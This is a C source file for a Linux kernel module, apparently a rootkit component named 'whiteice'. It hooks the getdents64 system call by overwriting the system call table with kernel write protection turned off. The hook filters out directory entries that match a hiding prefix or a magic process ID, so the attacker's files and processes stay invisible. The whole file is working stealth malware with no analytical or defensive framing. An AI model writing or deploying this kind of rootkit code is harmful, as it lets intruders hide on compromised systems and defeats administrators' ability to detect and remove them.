#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/syscalls.h>

#include "hook_defs.h"
#include "syscall_table.h"

asmlinkage long (*original_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);

asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{
    long ret = original_getdents64(fd, dirent, count);
    struct linux_dirent64 *d, *kbuf, *prev = NULL;
    unsigned long offset = 0;

    if (ret <= 0) return ret;

    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf) return ret;

    if (copy_from_user(kbuf, dirent, ret)) {
        kfree(kbuf);
        return ret;
    }

    while (offset < ret) {
        d = (struct linux_dirent64 *)((char *)kbuf + offset);

        if (d->d_ino != 0 && 
            (strncmp(d->d_name, HIDE_PREFIX, HIDE_PREFIX_LEN) == 0 ||
             is_pid_hidden(d->d_name))) {

            if (d == kbuf) {
                ret -= d->d_reclen;
                memmove(d, (char *)d + d->d_reclen, ret);
                continue;
            } else {
                prev->d_reclen += d->d_reclen;
            }
        } else {
            prev = d;
        }

        offset += d->d_reclen;
    }

    if (copy_to_user(dirent, kbuf, ret)) {
        kfree(kbuf);
        return ret;
    }

    kfree(kbuf);
    return ret;
}

int is_pid_hidden(const char *name)
{
    int pid;
    if (kstrtoint(name, 10, &pid) == 0) {
        if (pid == MAGIC_TRIGGER_PID)
            return 1;
    }
    return 0;
}

void enable_getdents64_hook(unsigned long **syscall_table)
{
    original_getdents64 = (void *)syscall_table[__NR_getdents64];
    disable_write_protection();
    syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64;
    enable_write_protection();

    printk(KERN_INFO "[whiteice:hide_process] 🐧 getdents64 hook start.\n");
}

void disable_getdents64_hook(unsigned long **syscall_table)
{
    disable_write_protection();
    syscall_table[__NR_getdents64] = (unsigned long *)original_getdents64;
    enable_write_protection();

    printk(KERN_INFO "[whiteice:hide_process] getdents64 restaured.\n");
}
